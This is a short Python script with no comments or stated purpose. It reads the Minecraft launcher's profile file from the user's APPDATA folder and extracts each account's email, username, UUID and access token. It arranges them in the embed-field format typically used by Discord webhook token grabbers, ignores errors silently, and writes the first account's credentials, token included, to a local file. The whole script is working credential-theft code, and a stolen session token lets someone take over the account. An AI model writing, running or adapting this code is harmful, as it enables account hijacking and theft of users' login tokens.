import json
import os


def uuid_dashed(uuid):
    return f"{uuid[0:8]}-{uuid[8:12]}-{uuid[12:16]}-{uuid[16:21]}-{uuid[21:32]}"


def main():
    auth_db = json.loads(open(os.getenv("APPDATA") + "\\.minecraft\\launcher_profiles.json").read())[
        "authenticationDatabase"]

    embeds = []

    for x in auth_db:
        try:
            email = auth_db[x].get("username")
            uuid, display_name_object = list(auth_db[x]["profiles"].items())[0]
            embed = {
                "fields": [
                    {"name": "Email", "value": email if email and "@" in email else "N/A", "inline": False},
                    {"name": "Username", "value": display_name_object["displayName"].replace("_", "\\_"),
                     "inline": True},
                    {"name": "UUID", "value": uuid_dashed(uuid), "inline": True},
                    {"name": "Token", "value": auth_db[x]["accessToken"], "inline": True}
                ]
            }
            embeds.append(embed)
        except:
            pass

    embs = embeds[0]
    d = embs["fields"]
    mail = d[0]["value"]
    name = d[1]["value"]
    uuid = d[2]["value"]
    token = d[3]["value"]
    f = open("./data", "w")
    f.write("{\"email\":\""+mail+"\", \"name\":\""+name+"\", \"uuid\":\""+uuid+"\", \"token\":\""+token+"\"}")
    f.close()


main()